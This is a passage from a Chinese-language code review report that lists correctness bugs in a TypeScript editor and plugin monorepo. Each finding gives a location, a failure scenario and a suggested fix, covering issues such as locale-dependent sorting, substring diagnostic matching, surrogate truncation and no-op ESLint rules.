**失败场景**: prop 绑定为 42,用户全选清空准备重输,立即向 Outbox 提交字面量 0 并产生一次 revision/历史记录;若用户此时被中断(如切走选区),canonical 绑定停留在 0 而非用户预期值;若该 prop 后续有取值约束,0 还会触发瞬时诊断。

**修复建议**: 对空串单独处理:不发布(保持原值)或发布 clearBinding;仅在非空且解析成功时 publishLiteral,避免把清空动作解释为 0。

##### L-C-10 issueTargetsBinding/issueTargetsSlot 用 includes 子串匹配,诊断会串到前缀同名的成员上

- **位置**: [`apps/web/src/editor/features/blueprint/editor/inspector/domain/componentInstanceInspectorModel.ts:162`](apps/web/src/editor/features/blueprint/editor/inspector/domain/componentInstanceInspectorModel.ts#L162)
- **类别**: correctness ｜ **置信度**: high ｜ **验证状态**: 未验证 ｜ **审查单元**: web-bp-insp-b

**详情**: issueTargetsBinding 用 issue.path.includes(/bindings/props/ 加 escaped(memberId)) 判断诊断归属,缺少段边界(结尾的 / 或串尾)校验;issueTargetsSlot(行 172)同理匹配 /regionsById/node/slot。JSON Pointer 转义只处理 ~ 与 /,不阻止前缀重叠:指向 /bindings/props/labelledBy 的 issue 也包含 /bindings/props/label 子串。

**失败场景**: Public Contract 同时声明 prop label 与 labelledBy,实例在 labelledBy 上的绑定产生一条图校验 issue,该诊断会同时挂在 label 属性下显示,用户按错误提示去修 label,实际 label 并无问题;slot/node id 存在前缀关系时同样误报。

**修复建议**: 改为按 / 分段精确比较,或匹配 /bindings/props/escaped/ 与 /bindings/props/escaped 结尾两种边界(例如用 startsWith 于完整段加检查下一字符为 / 或串尾)。

##### L-C-11 无单位 lineHeight 被 readCssValue 显示为 px,误导单位换算

- **位置**: [`apps/web/src/editor/features/blueprint/editor/inspector/panels/TypographyPanel.tsx:39`](apps/web/src/editor/features/blueprint/editor/inspector/panels/TypographyPanel.tsx#L39)
- **类别**: correctness ｜ **置信度**: medium ｜ **验证状态**: 未验证 ｜ **审查单元**: web-bp-insp-b

**详情**: readCssValue(node.style?.lineHeight) 对 number 一律返回 value px(layoutPanelHelpers.ts:41)。PIR style 值是 PIRJsonValue,允许 number;React 中 lineHeight: 1.5 是无单位倍数。面板因此把 1.5 显示为 amount 1.5 加单位 px。用户若以为当前是 px 而把单位切换为 em,UnitInput 会发出 1.5em 并被 updateStyleValue 原样写入,语义从 1.5 倍变成 1.5em(16px 字体下约 24px),静默改变渲染。

**失败场景**: 文档/AI 写入 style.lineHeight=1.5(number),面板显示 1.5 px,用户切单位为 em 想统一单位,写入 1.5em,行高从相对值变成绝对长度,多处文本版式变化。

**修复建议**: lineHeight 的读取应识别无单位数字(显示时不带 px,单位选择器呈现为无单位/normal),或在 readCssValue 之外为 lineHeight 提供专用读取,避免把倍数当像素展示。

##### L-C-12 受控代码编辑计划 unchanged 时草稿永不收敛,陷入永久 dirty

- **位置**: [`apps/web/src/editor/features/code/useCodeAuthoringSession.ts:221`](apps/web/src/editor/features/code/useCodeAuthoringSession.ts#L221)
- **类别**: correctness ｜ **置信度**: medium ｜ **验证状态**: 未验证 ｜ **审查单元**: web-code-issues

**详情**: save() 先以 document.content.source === sourceToSave 短路,随后走受控分支 createControlledCodeEditPlan。该计划把受控区域重投影为 canonicalSource(controlledRoundTrip.ts 中 canonicalSource = replacement.source),当用户编辑对 PIR 语义与规范化源码均无影响时返回 status unchanged。此处 if (controlledPlan.status === unchanged) return status unchanged 既不调用 reconcileCodeAuthoringSessionArtifact 也不 complete save,而 draft.source(用户原文)仍与 canonical 文档源码不同,草稿永远 dirty:保存按钮常亮但每次 Ctrl+S 都返回 unchanged,useWorkspaceHistoryShortcuts 因 suspended isDirty 一直挂起,用户只能手动 Discard 自己的(语义等价的)编辑。

**失败场景**: 打开带受控源码清单的 event-handler 代码槽,在受控区域内只做空白/注释级改动后保存,受控投影判定 unchanged,会话草稿未收敛,脏标记与历史快捷键挂起永久持续,反复保存无任何变化。

**修复建议**: 在 unchanged 分支中调用 updateSession(reconcileCodeAuthoringSessionArtifact(current, projectArtifactSnapshot(workspace, artifactId))),把草稿收敛到 canonical 快照(或把 draft 源码规范化后再比较),避免永久 dirty。

##### L-C-13 toSafeNodeGraphFileStem 按 UTF-16 码元 slice(0,48) 会切断代理对,产生孤立代理项

- **位置**: [`apps/web/src/editor/features/development/reactflow/nodeGraphWorkspaceDocuments.ts:67`](apps/web/src/editor/features/development/reactflow/nodeGraphWorkspaceDocuments.ts#L67)
- **类别**: correctness ｜ **置信度**: medium ｜ **验证状态**: 未验证 ｜ **审查单元**: web-dev-b

**详情**: 规范化流程先 replace 非字母数字 替换为 - 保留所有字母数字(含 BMP 外的字母字符,它们在 UTF-16 中占2个码元),随后 .slice(0, 48) 按码元截断,可能正好切在非 BMP 字符的代理对中间,使 stem 末尾带一个孤立高代理项。该 stem 进入 VFS 路径(createAvailableNodeGraphPath 第95行)并经 JSON 传往 Go 后端;Go 解码 JSON 时把孤立代理项替换为 U+FFFD,客户端持有的路径(含代理项)与后端存储/回读的路径(含替换字符)永不相等。

**失败场景**: 新建/重命名图时名称为25个非 BMP 字母(如 Deseret 或 CJK 扩展B字符):截断后 stem 末尾为孤立代理项;后端落库路径变成 U+FFFD 版本,之后 createAvailableNodeGraphPath 的 usedPaths 去重与 createRenamedNodeGraphPath 的目录解析都匹配不到该文档,可能生成冲突路径或重命名目标不一致。

**修复建议**: 按码点截断:Array.from(normalized).slice(0, 48).join(空) 后再做尾部 - 清理;或截断后去除孤立代理项。

##### L-C-14 删除文件夹绕过对后代的 route/语义引用 fail-closed 检查

- **位置**: [`apps/web/src/editor/features/resources/PublicResourcePage.tsx:515`](apps/web/src/editor/features/resources/PublicResourcePage.tsx#L515)
- **类别**: correctness ｜ **置信度**: medium ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: web-resources

**详情**: 绕过检查属实且无 intent/后端兜底,但悬空引用目前基本潜在:collectRouteDocumentRefs 只收 layout/pageDocId(PIR 页面,结构上不指向 /public 资产),且当前无任何语义 provider 贡献指向 asset 符号的引用边(AssetReference 机制仅为未接线契约)。属 fail-closed 契约漏洞,资产引用接线后将真实触发,故降为 low。

**失败场景**: /public/icons 下存在被 RouteManifest 或 PIR 节点引用的 logo.png;用户右键删除 icons 文件夹(而非逐个删文件),引用检查被整体跳过,intent 规划成功生成删除命令,logo.png 被删,route/组件中出现指向不存在资产的悬空引用。

**修复建议**: 文件夹删除前递归收集子树文档 id,对每个文档执行与文件分支相同的 route 引用与 semanticIndex.getReferences 检查,任一被引用则阻断并提示(或由 intent plan 层统一做引用校验)。

**验证备注**: 已核实:handleDeleteNode 文件夹分支(514-522)无任何检查即发 deleteWorkspaceDirectoryIntentRequest;文件分支(524-555)有 route 与 getReferences 双阻断。deleteDirectory(397-423)仅 411 行不可清空全部文档防护;后端 store_operation_commit_validation.go 只校 revision vector。

##### L-C-15 delete-modify 节点冲突的 LOCAL 视觉回退到 base,掩盖本地删除

- **位置**: [`apps/web/src/editor/features/revisionConflict/nodeGraphDiffAdapter.ts:563`](apps/web/src/editor/features/revisionConflict/nodeGraphDiffAdapter.ts#L563)
- **类别**: correctness ｜ **置信度**: medium ｜ **验证状态**: 未验证 ｜ **审查单元**: web-anim-conflict

**详情**: buildNodePresentations 对冲突节点取 records.local 或 records.base 或 records.candidate(563) 作为 LOCAL 卡片记录。当本地删除了该节点(delete-modify 冲突)时,wholeEntityState 命中整实体删除变更返回 present false,materializeEntityRecord 因此返回 undefined(409-413),且 local 快照无该节点,records.local=undefined,回退到 base 记录。LOCAL 卡片照常展示 base 的 label/nodeKind/description 且状态为 conflict-local,看起来本地仍保有该节点。

**失败场景**: 本地删除节点 n1、远端修改 n1 的 label,delete-modify 冲突。图中 LOCAL 副本仍显示 n1 的 base 内容,REMOTE 显示新 label;用户在图上点 Use local 以为保留 base 版节点,实际应用的是删除。仅左侧冲突卡以空暗示本地值,主图无任何删除提示。

**修复建议**: 当某侧整实体状态为 present false 时,为该侧冲突视觉打上 deleted 标记(如 label 显示 (deleted)、降低不透明度或叠加删除语义),而不是回退 base 记录。

##### L-C-16 触碰冲突节点的非冲突边只挂到 REMOTE 副本,LOCAL 副本悬空

- **位置**: [`apps/web/src/editor/features/revisionConflict/nodeGraphDiffAdapter.ts:636`](apps/web/src/editor/features/revisionConflict/nodeGraphDiffAdapter.ts#L636)
- **类别**: correctness ｜ **置信度**: medium ｜ **验证状态**: 未验证 ｜ **审查单元**: web-anim-conflict

**详情**: createEdgePresentation 的 endpointVisualId 对非冲突边(side 为 undefined)使用 conflictedNodeIds.has(nodeId) 时取 ::remote 否则空(636),即恒指向冲突节点的 REMOTE 视觉。buildEdgePresentations 仅在 status===unchanged 且 touchesConflict 时复制 local/remote 两条边(711-725);modified/added/deleted 边只生成一条,端点永远落在 n::remote 上。

**失败场景**: 节点 n1 存在冲突(画布上有 L/R 两个副本),连接 n1 的边 e1 被本地修改(status=modified):画布只渲染一条 e1 连到 n1::remote,LOCAL 副本看起来完全断开。用户在评估选 local 后 n1 的连线时得不到任何视觉依据,容易误判本地拓扑。

**修复建议**: 对触碰冲突节点的 modified/added/deleted 边也按变更归属生成本地/远端副本(有 localChanges 挂 ::local,有 remoteChanges 挂 ::remote,两侧都有则各生成一条)。

##### L-C-17 summarizeNodeGraphDiff 忽略边冲突,图头部未解决计数为 0

- **位置**: [`apps/web/src/editor/features/revisionConflict/revisionConflictPresentation.ts:283`](apps/web/src/editor/features/revisionConflict/revisionConflictPresentation.ts#L283)
- **类别**: correctness ｜ **置信度**: high ｜ **验证状态**: 未验证 ｜ **审查单元**: web-anim-conflict

**详情**: summarizeNodeGraphDiff(283-304) 只遍历 nodes 计算 conflictCount/unresolvedConflictCount,完全不统计 edges。但 nodeGraphDiffAdapter.buildEdgePresentations(670-697) 会为冲突边生成 conflict-local/remote 视觉,NodeGraphDiffView(583-621) 也渲染 Edge conflicts 解决面板;图头部(517-522) 直接展示该 summary,于是边级冲突在头部被计为 0。

**失败场景**: 本地与远端同时修改同一条边 e1 的 label,/edgesById/e1/label 上产生 value 冲突且无节点冲突:Edge conflicts 面板列出未解决的 e1 并带 Use local/remote 按钮,但头部显示 0 conflicts · 0 unresolved,误导用户以为该图无需处理。(Apply 按钮由 session.status 把关,不会误提交,仅呈现误导。)

**修复建议**: summary 同时聚合 edges 的 conflictIds(按 conflictId 与节点去重合并),或把计数字段明确命名为节点级统计并在头部合并展示边冲突数。

##### L-C-18 SSE 流完成判定过严:缺 [DONE] 或 [DONE] 带尾随空白时完整响应被整体丢弃

- **位置**: [`packages/ai/src/providers/openAICompatibleProvider.ts:269`](packages/ai/src/providers/openAICompatibleProvider.ts#L269)
- **类别**: correctness ｜ **置信度**: medium ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: pkg-ai-diag

**详情**: 核心成立但细节需修正:splitLines/splitSseFrames(text.ts:49-101)已处理各种换行,CR 不会泄入 data;Case B 仅在 [DONE] 行带字面尾随空格/制表符时触发。且主流 OpenAI-compatible 服务(vLLM/Ollama/LM Studio)均发送 [DONE],故无 [DONE] 关流(Case A)才是主要现实风险,触发面较窄,严重度宜降为 low。

**失败场景**: 用户连接一个不发 [DONE] 的 OpenAI-compatible 网关(部分 vLLM/Ollama/代理配置),流正常结束且 rawResponse 已是合法 JSON,stream() 抛 AI-4010 ended before completion,gateway 产出失败任务,本可成功的回答被丢弃;或服务端发 data: [DONE] 带尾随空格,JSON.parse 抛错,同样失败。

**修复建议**: 比较前先 trim:data.trim() === [DONE];流自然结束且无 [DONE] 时,若 rawResponse 非空则尝试 parseStructuredOutputText 加校验,仅在 rawResponse 为空/不可解析时才报 AI-4010。

**验证备注**: 已读 openAICompatibleProvider.ts:269 严格 data===[DONE] 无 trim;292-297 行非 receivedDone 抛 AI-4010 并丢弃已累积 rawResponse。readFrameData(100-109)仅剥一个前导空格,108 行返回未 trim 原值,尾随空白保留。

##### L-C-19 cubic-bezier 解析未限制 x1/x2 属于 [0,1],非单调曲线求解出错误分支

- **位置**: [`packages/animation/src/animationEvaluation.ts:24`](packages/animation/src/animationEvaluation.ts#L24)
- **类别**: correctness ｜ **置信度**: medium ｜ **验证状态**: 未验证 ｜ **审查单元**: pkg-ng-anim

**详情**: parseCubicBezier 的正则允许任意实数 x 分量(第24行),isSupportedAnimationEasing 因此对 cubic-bezier(1.5,0,-0.5,1) 返回 true(第41行),ANI-5102 守卫不会触发。但 CSS 规范要求 x1/x2 属于 [0,1];越界时 sampleX 非单调、同一 x 有多个根,solveX 的牛顿迭代(第61-69行)从 t=value 出发可能收敛到错误分支,返回与浏览器 CSS 动画完全不同的 eased 值。

**失败场景**: 时间线 easing=cubic-bezier(1.5,0,-0.5,1)、opacity 0 到 1 在 progress 约 0.2 处:solveX 收敛到近 0 的根,输出 opacity 约 0 而非预期插值;浏览器会把该 easing 判为非法并回退,两端行为分叉,且运行时判定为受支持不会给出诊断。

**修复建议**: parseCubicBezier 中对 x1/x2 追加 [0,1] 范围校验,越界返回 null(由 isSupportedAnimationEasing 判为不支持,走 ANI-5102);y1/y2 保持允许越界以支持 overshoot。

##### L-C-20 多处用 localeCompare 做规范化排序,跨运行时 locale/ICU 差异产生不同 URL 与值键序

- **位置**: [`packages/data-http/src/dataHttpAdapter.ts:122`](packages/data-http/src/dataHttpAdapter.ts#L122)
- **类别**: correctness ｜ **置信度**: medium ｜ **验证状态**: 未验证 ｜ **审查单元**: pkg-data-conn

**详情**: appendQuery 用 left.localeCompare(right) 决定查询串顺序(121-123行),直接改变发出的 URL;dataGraphqlAdapter.ts:210、dataAsyncApiAdapter.ts:209、dataMockRuntime.ts:154 也用 localeCompare 对响应/值的对象键排序做规范化克隆。localeCompare 依赖默认 locale 与 ICU 数据(Node small-icu 与浏览器、client 与 server zone 可能不同 collation,如 sv/en 对 ä 与 z 的相对顺序相反),同一输入在不同环境得到不同的规范化结果。

**失败场景**: 查询入参含键 ä 与 z:en collation 下 URL 为 ?ä=..&z=..,sv collation(或无 full-ICU 的 Node)下为 ?z=..&ä=..,同一逻辑请求在不同 zone 产生不同 URL 串,破坏按 URL 的缓存/去重;响应值键序差异同理影响下游对值做 JSON 摘要的一致性。

**修复建议**: 统一改用代码单元比较(与本仓库已有的 compareText/left 小于 right 一致),保证排序与 locale、ICU 配置无关。

##### L-C-21 导入器与适配器的保留 header 名单不一致,host/content-type 等 header 参数导入后每次调用必失败

- **位置**: [`packages/data-http/src/dataOpenApiImporter.ts:770`](packages/data-http/src/dataOpenApiImporter.ts#L770)
- **类别**: correctness ｜ **置信度**: high ｜ **验证状态**: 未验证 ｜ **审查单元**: pkg-data-conn

**详情**: parseParameters 的 header 参数只拦截 authorization/cookie/proxy-authorization/set-cookie 四个名字(769-777行);而 dataHttpAdapter.ts 的 reservedIdempotencyHeaders(444-454行)含 9 个名字,readParameterMappings 会对 host、content-type、connection、content-length、transfer-encoding 抛 HTTP header parameter mapping is unsafe。导入时零告警生成 parameterMappings.header,采纳后 operation 在 invoke 阶段恒定抛 DATA_HTTP_CONFIGURATION_INVALID。

**失败场景**: OpenAPI operation 声明 name content-type in header 参数,导入 proposal ready、被采纳,之后每次调用在 readParameterMappings 处抛 DATA_HTTP_CONFIGURATION_INVALID,operation 永久不可用,而导入阶段没有任何 issue 提示。

**修复建议**: 把保留 header 名单抽成两个包共享的单一常量,导入器对命中名单的 header 参数出 unsupportedShape/securityUnsupported issue,使导入期与运行期判定一致(fail at import, not at every invoke)。

##### L-C-22 schemasById/operationsById 存在性查找未防 Object.prototype 同名键,悬空引用可通过校验

- **位置**: [`packages/data/src/dataDocument.ts:1843`](packages/data/src/dataDocument.ts#L1843)
- **类别**: correctness ｜ **置信度**: high ｜ **验证状态**: 未验证 ｜ **审查单元**: pkg-data

**详情**: 第 1843 行 if (schemaId 且 非 document.schemasById[schemaId]) 直接用下标判断存在性(未用 Object.hasOwn);dataRuntime.ts:592(const schema = input.document.schemasById[input.schemaId])与 641 行 operationsById 查找同样未设防。当 id 为 toString、constructor、**proto** 等 Object.prototype 成员名时,查找命中继承成员(truthy)。注意包内其它指针读取(dataCacheRuntime.ts:225、dataOptimisticRuntime.ts:259、dataDispatchRuntime.ts:285)都正确使用了 hasOwnProperty 防护,此处是遗漏。

**失败场景**: operation 声明 outputSchemaId toString 且 schemasById 未定义该 schema:validateRelations 误判存在,非法文档校验通过;运行时 validateOperationPayload 取到 Function,schema.schema 为 undefined,Ajv compile 抛错被包装成 DATA_SCHEMA_UNSUPPORTED(应为 DATA_SCHEMA_MISSING)。若 operationId 为 toString:executeDataOperation 越过第 642 行存在性检查,随后在 operation.policies.pagination 处对 undefined 取属性抛出误导性 TypeError。

**修复建议**: 所有 byId 记录查找改为 Object.hasOwn(map, id) 时取 map[id] 否则 undefined,或以 Object.create(null) 构建这些映射。

##### L-C-23 Issues 文本搜索被 stableSerialize 的 undefined 字面量与多余 }} 污染

- **位置**: [`packages/diagnostics/src/diagnosticIssueCollection.ts:364`](packages/diagnostics/src/diagnosticIssueCollection.ts#L364)
- **类别**: correctness ｜ **置信度**: high ｜ **验证状态**: 未验证 ｜ **审查单元**: pkg-ai-diag

**详情**: queryDiagnosticIssues 的可搜索数组含 stableSerialize(issue.diagnostic.targetRef)(364 行)。stableSerialize 对 undefined 返回字符串 undefined(27 行:JSON.stringify(value) 或 undefined),该字符串为 truthy,.filter(Boolean)(367 行)不会剔除,于是每个无 targetRef 的 issue 都带有 undefined 搜索文本。另外 stableSerialize 对象分支模板多拼了一个 }(38 行),所有对象序列化(含 targetRef 与 fingerprint)都带畸形尾随 }},使搜索 }} 命中全部带位置的 issue。

**失败场景**: 用户在 Issues 面板搜索框输入 def/fine/undefined 等 undefined 的任意子串,所有无 targetRef 的诊断(如 workspace 级诊断)全部被错误命中;输入 }} 则命中所有带 targetRef 的 issue,搜索结果与查询意图无关。

**修复建议**: 将 364 行改为 issue.diagnostic.targetRef 时 stableSerialize(targetRef) 否则 undefined(交由 filter(Boolean) 剔除);并修正 38 行模板为单个闭合括号,避免 fingerprint/issue id 携带畸形字符。

##### L-C-24 no-circular/no-type-error 为空壳实现却以 error 级别进入 recommended 门禁

- **位置**: [`packages/eslint-plugin-prodivix/src/rules/no-circular.ts:19`](packages/eslint-plugin-prodivix/src/rules/no-circular.ts#L19)
- **类别**: correctness ｜ **置信度**: high ｜ **验证状态**: 未验证 ｜ **审查单元**: pkg-conformance

**详情**: no-circular 的 ImportDeclaration 处理函数(19-26 行)只读取 context.filename/node.source.value 后留下需要构建全局模块依赖图注释,no-type-error 的 CallExpression/BinaryExpression(17-24 行)函数体同样只有注释,二者从不调用 context.report。但 index.ts:20-21 将它们注册为 error 级别并打包进 configs.recommended,而 package.json:13 的 test 脚本是 echo No tests for eslint-plugin-prodivix 加 exit 0,根级 pnpm test 对该包零校验。

**失败场景**: 下游在 ESLint 中启用该插件 recommended 配置作为 lint 门禁后,存在真实循环依赖或操作数类型错配的 PIR 模块也会得到 0 条 error,门禁恒绿、静默放行;当前仓库虽尚未引用该插件(grep 未见 eslint 配置消费它),但任何采纳都立即获得一个永不失败的假门禁。

**修复建议**: 实现完成前将这两条规则从 recommended 移除或显式标注为未实现占位;实现时在 Program:exit 基于导入图做 DFS 环检测,并为每条规则编写 RuleTester 正/反例测试,替换 echo 空测试脚本。

##### L-C-25 no-unused-var 把声明本身计为使用,规则对任何输入都永不报告

- **位置**: [`packages/eslint-plugin-prodivix/src/rules/no-unused-var.ts:30`](packages/eslint-plugin-prodivix/src/rules/no-unused-var.ts#L30)
- **类别**: correctness ｜ **置信度**: high ｜ **验证状态**: 已对抗验证 ｜ **审查单元**: pkg-conformance

**详情**: Identifier 选择器(第 30-32 行)对遍历到的每个 Identifier 节点执行 usedVars.add(node.name);而 VariableDeclarator 的 id 本身也是 Identifier,AST 遍历时同样会触发该监听器。因此 const unused = 1 的声明名在 Program:exit(34-44 行)判定前就已进入 usedVars,!usedVars.has(name) 恒为 false,context.report 永不调用。index.ts:22 将该规则以 warn 纳入 recommended 配置,但其对所有输入输出 0 条诊断;此外该实现按名字而非作用域匹配,即使修掉自引用问题,跨作用域同名变量也会误判。

**失败场景**: 任意消费者启用 recommended 配置后对含 const unused = 1(从未被引用)的文件运行 ESLint:声明 id 被第 30 行的 Identifier 监听器加入 usedVars,Program:exit 判定其已使用,规则输出 0 条 unused 诊断——声明的检测能力完全失效,未使用变量全部静默通过。

**修复建议**: 改用 context.sourceCode.scopeManager 做作用域分析,仅当 variable.references 为空(排除定义自身引用)时报告;或在 Identifier 监听器中排除声明位置(VariableDeclarator.id、函数参数、函数/类名)。并补充规则级 RuleTester 用例替代 package.json 中的 echo 空测试。

**验证备注**: 已读 no-unused-var.ts:第25行仅登记 Identifier 型 id 进 declaredVars,第30-32行 Identifier 监听器对遍历到的每个 Identifier(含声明 id 自身)无条件 usedVars.add,故第36行 !usedVars.has(name) 恒 false,report 永不调用。用 ESLint Linter 实跑:含未用变量的代码输出 0 条消息,规则对任何输入失效。

##### L-C-26 执行输出键排序使用 localeCompare,跨宿主语言环境不确定

- **位置**: [`packages/nodegraph/src/nodeGraphExecutionProvider.ts:119`](packages/nodegraph/src/nodeGraphExecutionProvider.ts#L119)
- **类别**: correctness ｜ **置信度**: medium ｜ **验证状态**: 未验证 ｜ **审查单元**: pkg-ng-anim

**详情**: toExecutionValue 的 record 分支与 toExecutionRecord 均用 Object.entries(value).sort 按 left.localeCompare(right)(第119行、第137行)生成冻结输出对象的插入序。localeCompare 未指定 locale,使用宿主默认区域与 ICU 排序表:混合大小写 ASCII(B 与 a)及非 ASCII 键(如 ä、CJK)在 de-DE/en-US/sv-SE 下顺序不同,且随 ICU 版本变化。该 provider 以确定性 NodeGraph kernel 适配为卖点,输出会进 ExecutionJobResult 并被序列化/比对。

**失败场景**: 自定义执行器向 statePatch 写入键 Über 与 zebra:在 de-DE 开发机与 en-US CI 上 toExecutionRecord 产生不同键序,同一图同一输入的 JSON.stringify(output) 字节不同,golden/快照或幂等提交哈希跨环境不一致。

**修复建议**: 改用与区域无关的码点序比较(如 left 小于 right 返回 -1、left 大于 right 返回 1、否则 0,与本仓库 semantic provider 的 compareText 一致),或显式 localeCompare(right, en, usage sort)。

##### L-C-27 DeferredIcon 兜底缓存键未包含 variant,同名不同 variant 的图标会渲染错误变体

- **位置**: [`packages/pir-react-renderer/src/host/iconRegistry.ts:301`](packages/pir-react-renderer/src/host/iconRegistry.ts#L301)
- **类别**: correctness ｜ **置信度**: high ｜ **验证状态**: 未验证 ｜ **审查单元**: pkg-pir-renderer

**详情**: resolveIconRef 在 provider 尚未 ready 时创建 DeferredIcon 兜底组件,缓存键为 provider.id 加 normalizeKey(value.name)(第301行),不含 variant;且 DeferredIcon 闭包捕获首个 iconRef 的 value,ready 后重渲染时仍执行 nextProvider?.resolve(value.name, value)(第316-317行)。缓存存活于整个模块生命周期,仅 unregisterIconProvider 时清理。heroicons provider 的 resolveHeroiconsIcon 明确依据 iconRef.variant 区分 outline/solid。

**失败场景**: heroicons 运行时未加载完成时,同一渲染树中出现 iconRef heroicons home outline 与 heroicons home solid 两个 PdxIcon:第二个命中第一个建立的缓存,其 DeferredIcon 永远用首个 value(variant outline)解析,solid 图标在 provider ready 后仍被渲染为 outline,且不会自愈。

**修复建议**: 缓存键加入规范化后的 variant(如 provider.id 加 name 加 variant);或让 DeferredIcon 不捕获 value,改从自身 props 读取 iconRef 再解析。

##### L-C-28 元素变更 changed 判定拿未规范化输入与规范化现状比较,恒为假阳性

- **位置**: [`packages/pir/src/mutations/pirElementAuthoringMutations.ts:138`](packages/pir/src/mutations/pirElementAuthoringMutations.ts#L138)
- **类别**: correctness ｜ **置信度**: high ｜ **验证状态**: 未验证 ｜ **审查单元**: pkg-pir

**详情**: updatePirElementNode(138 行)const changed = JSON.stringify(current) 不等于 JSON.stringify(input.node),updatePirElementNodes(213 行)changed ||= JSON.stringify(current) 不等于 JSON.stringify(update.node)。current 来自 tryNormalizePirDocument 到 canonicalize,各级 key 已排序;input.node 是调用方原始对象,key 顺序通常非 canonical(如 current 展开加 text 会把 text 排在 type 之后,而排序应为 text 小于 type)。语义完全相同的内容也会判 changed:true 并返回重规范化后的新 document。对比 updatePirComponentInstanceBindings/updatePirCollection 都用 compareGraph 比较两侧 canonical 形式,只有元素变更不对称。

**失败场景**: Inspector 以 node 等于 current 展开加 text 原值 回写(内容零变化),mutation 仍报 changed:true;上层据 changed 决定是否写 Outbox/History 时,每次保存都产生一次语义空操作提交与冗余历史记录(强幂等 Atomic Commit 按内容去重,故不致损坏数据,但变更信号失真)。

**修复建议**: 在规范化之后再计算 changed:比较 candidate 图中该节点与 current 的 canonical JSON(与 compareGraph 同策略),或先对 input.node 做规范化再比较。

##### L-C-29 insertedNodeIds 用 localeCompare 排序,跨环境顺序不确定且与包内其余确定性排序不一致

- **位置**: [`packages/pir/src/mutations/pirGraphFragmentMutation.ts:275`](packages/pir/src/mutations/pirGraphFragmentMutation.ts#L275)
- **类别**: correctness ｜ **置信度**: medium ｜ **验证状态**: 未验证 ｜ **审查单元**: pkg-pir

**详情**: insertPirGraphFragment 返回的 insertedNodeIds 用 left.localeCompare(right) 排序(274-278 行),经 duplicatePirGraphSubtree 透传。而本包所有其他确定性输出(freezePirMutationIssues、collectPirSubtreeNodeIds、createDuplicateIds 等)一律用 compareText 码元序;localeCompare 依赖运行时默认 locale 与 ICU 排序规则。pirValidator.ts:96 的 sortedEntries 同样误用 localeCompare(影响 issues 顺序)。

**失败场景**: fragment 节点 id 为 A2,a1 时,compareText 序为 A2,a1,en-US 排序规则为 a1,A2;同一 fragment 插入在 Node 后端(随 LANG/ICU 版本)与浏览器中可能产出不同 insertedNodeIds 顺序。若上层 Transaction/Outbox 对该数组做顺序相关哈希或差异比较,强幂等提交回放会出现环境相关的假差异。

**修复建议**: 将 274-278 行(及 pirValidator.ts:96)改为 compareText 码元序排序,与包内其余确定性排序统一。

##### L-C-30 并发上限拒绝时已消耗的速率令牌不归还,误伤后续合规请求

- **位置**: [`packages/plugin-browser/src/gateway/createBrowserGatewaySessionFactory.ts:222`](packages/plugin-browser/src/gateway/createBrowserGatewaySessionFactory.ts#L222)
- **类别**: correctness ｜ **置信度**: medium ｜ **验证状态**: 未验证 ｜ **审查单元**: pkg-plugin-browser

**详情**: dispatch 的限额判定为 非 sessionBucket.consume() 或 非 state.bucket.consume() 或 activeRequests 大于等于 quota.maxConcurrentRequests 或 state.active 大于等于 contract.limits.maxConcurrency,短路求值导致先消费 session/method 速率令牌,再检查并发上限;被并发上限拒绝的请求不会归还已 consume 的令牌,finally 也不处理(未进入 activeRequests+=1 分支)。

**失败场景**: document/apply-patch 限额 maxConcurrency 1、requestBurst 8、requestsPerSecond 8。插件并发发出 10 个 patch:1 个执行,其余 9 个在并发检查处被拒,但已耗尽 method 桶 8 个 burst 令牌;随后插件改为串行、完全合规地继续发 patch,在接下来约 1 秒内持续收到 GATEWAY_QUOTA_EXCEEDED,与声明的速率策略不符。

**修复建议**: 先做并发上限判断,再 consume 速率令牌;或在并发拒绝分支中对已消费的 sessionBucket/state.bucket 做等价补偿(refill),使速率计量只覆盖真正进入执行/排队的请求。

##### L-C-31 304 等 3xx 非重定向状态被当作重定向并要求 Location,条件 GET 必然失败

- **位置**: [`packages/plugin-browser/src/gateway/network/gatewayNetworkAdapter.ts:150`](packages/plugin-browser/src/gateway/network/gatewayNetworkAdapter.ts#L150)
- **类别**: correctness ｜ **置信度**: medium ｜ **验证状态**: 未验证 ｜ **审查单元**: pkg-plugin-browser

**详情**: redirect manual 下对 response.status 大于等于 300 且 小于 400 一律按重定向处理:const location = response.headers.get(location); if 非 location 或 redirects 大于等于 policy.maxRedirects 返回 gatewayNetworkDenied。304 Not Modified(以及 300/305/306)并非携带 Location 的重定向,304 无 Location 时会以 redirect is missing a visible location 被拒绝。

**失败场景**: 宿主在 allowedRequestHeaders 中加入 if-none-match,插件对 https://api.example.com/v1/items 发条件 GET;源站返回 304(无 Location、空 body)。适配器不返回 304 语义,而是返回 GATEWAY_NETWORK_POLICY_DENIED,插件无法实现缓存再验证,且每次重试都按失败计入审计与限额。

**修复建议**: 将重定向判定收窄为实际可跟随的重定向状态(301/302/303/307/308);对 304 等非重定向 3xx 按普通响应面交给插件(body 为空、暴露允许的头),或直接以明确的非重定向诊断返回。

##### L-C-32 shutdown 会对被自己 supersede 后自我删除的发现中记录报虚假失败

- **位置**: [`packages/plugin-host/src/lifecycle/createPluginHost.ts:97`](packages/plugin-host/src/lifecycle/createPluginHost.ts#L97)
- **类别**: correctness ｜ **置信度**: medium ｜ **验证状态**: 未验证 ｜ **审查单元**: pkg-plugin-host

**详情**: shutdown(createPluginHost.ts:92-103)在开始时对 context.records.keys() 做快照,逐个调用 runtime.deactivate(pluginId,host-shutdown) 与 availability.disable(pluginId);而 beginShutdown 会 supersede 所有在途 operation。一次无 previous 的首次 discover 在 validating 期间被 supersede 后,会走 publishFailedCandidate 的 非 previous 且 operation.superseded 分支(availabilityLifecycle.ts:51-59)把自己的 record 从 records/currentOwners 中删除。shutdown 循环随后对该 pluginId 调用 deactivate/disable,records.get 返回 undefined,invalidOperation 产生 PLG-4001 INVALID_HOST_TRANSITION(默认 severity error)。hasErrorDiagnostic 判定为真,shutdown 返回 pluginHostFailure——尽管宿主已正常关闭。

**失败场景**: 插件 X 的首次 discover 正处于权限解析/资源加载阶段(record 已发布为 validating)时调用 shutdown()。discover 被 supersede 并删除自己的 record;shutdown 循环对 X 的 deactivate/disable 均得到 Plugin is not discovered 错误诊断。最终 shutdown 结果 ok:false,上层误判宿主关闭失败并可能弹出错误提示,而宿主实际已进入 shutdown 状态。

